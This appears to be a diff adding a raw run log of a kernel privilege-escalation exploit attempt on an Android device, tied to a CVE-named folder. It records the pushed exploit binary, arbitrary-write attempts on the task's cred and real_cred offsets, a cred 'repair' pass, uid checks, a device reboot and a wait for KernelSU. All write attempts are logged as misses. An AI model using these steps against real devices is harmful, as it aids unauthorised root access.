@@ -1,0 +1,105 @@
+[04:45:55] === preflight ===
+* daemon not running; starting now at tcp:5037
+* daemon started successfully
+5.10.236-android12-9-o-gaf2075ad2c06
+Permissive
+964c5e6a-e52a-414f-8111-b98402d81126
+ 04:46:00 up 1 day,  7:53,  0 users,  load average: 4.10, 10.78, 19.69
+[04:46:02] push binary
+D:/Desktop/cve202643499/delivery/ghostlock-pfem10/exploit_guard: 1 file pushed, 0 skipped. 23.6 MB/s (72464 bytes in 0.003s)
+[04:46:03] === step 1: SELinux Permissive ===
+[04:46:04]   already Permissive (carried over in this boot) — skipping W1
+Permissive
+ 04:46:04 up 1 day,  7:53,  0 users,  load average: 4.01, 10.66, 19.60
+[04:46:05] === step 2: dmesg capture (readable now) ===
+[04:46:08]   dmesg lines before: 21466
+[04:46:09] === step 2.5: wait for load to settle ===
+[04:46:10]   load1=4.01
+[04:46:11] === step 3: LT child (pure userspace spin, NO_EXEC) ===
+[04:46:12]   LT attempt 1
+[04:46:33]   task=0xffffff8798ed0000 child_pid=11758 lt_parent=8776
+[04:46:34] === step 4: 0x778 (real_cred) ===
+[04:46:34]   W7 off=0x778 
+    [33m[*] [0m    fd_set shape: in[0]=0xffffff802a7c14b8 (write_value) in[1]=0 in[2]=0xffffff802ab99b6d (write_target)
+    [33m[*] [0mshape shift=0 wps=5: in[0]=0xffffff8787b5ade0 (write_value) in[2]=0xffffff8798ed0778 (write_target) out[1]=0xffffff8787b523e0 out[2]=0xffffff8787b50530
+    W7[W7] write value = private cred page 0xffffff8787b5ade0 (+0 shape comp)
+    W7[W7] side effect will land at cred_page+8 — run the LOCAL repair pass afterwards (V12_W7_ZERO=1 V12_W7_REPAIR_CRED=1)
+    W7[W7] write_value = 0xffffff8787b5ade0
+    W7[W7] write_target= 0xffffff8798ed0778
+    probe_state    = R
+    ✗ W7[W7] miss (probe_state=R)
+[04:47:26] === step 5: 0x780 (cred) ===
+[04:47:27]   W7 off=0x780 
+    [33m[*] [0m    fd_set shape: in[0]=0xffffff802a7c14b8 (write_value) in[1]=0 in[2]=0xffffff802ab99b6d (write_target)
+    [33m[*] [0mshape shift=0 wps=5: in[0]=0xffffff881bad2de0 (write_value) in[2]=0xffffff8798ed0780 (write_target) out[1]=0xffffff881baca3e0 out[2]=0xffffff881bac8530
+    W7[W7] write value = private cred page 0xffffff881bad2de0 (+0 shape comp)
+    W7[W7] side effect will land at cred_page+8 — run the LOCAL repair pass afterwards (V12_W7_ZERO=1 V12_W7_REPAIR_CRED=1)
+    W7[W7] write_value = 0xffffff881bad2de0
+    W7[W7] write_target= 0xffffff8798ed0780
+    probe_state    = D
+    ✗ W7[W7] miss (probe_state=D)
+[04:48:18] === step 6: LOCAL repair of cred_page+8 ===
+[04:48:18]   W7 off=0x780 V12_W7_ZERO=1 V12_W7_REPAIR_CRED=1
+    [33m[*] [0m    fd_set shape: in[0]=0xffffff802a7c14b8 (write_value) in[1]=0 in[2]=0xffffff802ab99b6d (write_target)
+    [33m[*] [0mshape shift=0 wps=5: in[0]=0xffffff87ee852de0 (write_value) in[2]=0x0 (write_target) out[1]=0xffffff87ee84a3e0 out[2]=0xffffff87ee848530
+    W7[W7] LOCAL repair target = cred_page+8 = 0xffffff87ee852de8
+    W7[W7] write_value = 0xffffff87ee852de0
+    W7[W7] write_target= 0x0
+    probe_state    = R
+    ✗ W7[W7] miss (probe_state=R)
+[04:49:02] === step 7: confirm cred BEFORE poking ===
+Uid:	2000	2000	2000	2000
+Gid:	2000	2000	2000	2000
+Groups:	1004 1007 1011 1015 1028 1078 1079 3001 3002 3003 3006 3009 3011 3012 
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+[04:49:04]   Uid line: [Uid: 2000 2000 2000 2000]
+[04:49:05]   !! Uid is NOT 0 0 0 0 — do NOT poke; cred/gid is not clean
+[04:49:05] === step 8: poke LT parent (forwards SIGUSR1 to the child) ===
+error: closed
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+[04:50:07] === step 9: watch framework + module for 150s ===
+[04:50:24]   t+10s up=43 services=5/5 kernelsu=0
+[04:50:40]   t+20s up=59 services=5/5 kernelsu=0
+[04:50:56]   t+30s up=75 services=5/5 kernelsu=0
+[04:51:13]   t+40s up=92 services=5/5 kernelsu=0
+[04:51:32]   t+50s up=110 services=5/5 kernelsu=0
+[04:51:49]   t+60s up=127 services=5/5 kernelsu=0
+[04:52:08]   t+70s up=146 services=5/5 kernelsu=0
+[04:52:24]   t+80s up=162 services=5/5 kernelsu=0
+[04:52:42]   t+90s up=181 services=5/5 kernelsu=0
+[04:53:02]   t+100s up=200 services=5/5 kernelsu=0
+[04:53:19]   t+110s up=218 services=5/5 kernelsu=0
+[04:53:37]   t+120s up=235 services=5/5 kernelsu=0
+[04:53:54]   t+130s up=252 services=5/5 kernelsu=0
+[04:54:10]   t+140s up=269 services=5/5 kernelsu=0
+[04:54:26]   t+150s up=285 services=5/5 kernelsu=0
+[04:54:27] === step 10: evidence ===
+[04:54:29]   no ROOTCHECK / path@@ line in the kernel log (expected if this version works)
+Uid:	1000	1000	1000	1000
+Gid:	1000	1000	1000	1000
+Groups:	0 1023 3009 
+CapEff:	0000000000800000
+Permissive
+ 04:54:31 up 4 min,  0 users,  load average: 6.48, 8.75, 4.47
+[04:54:34] evidence -> D:/Desktop/cve202643499/out/bootA_0918_044554
+[04:54:35] === boot A done ===
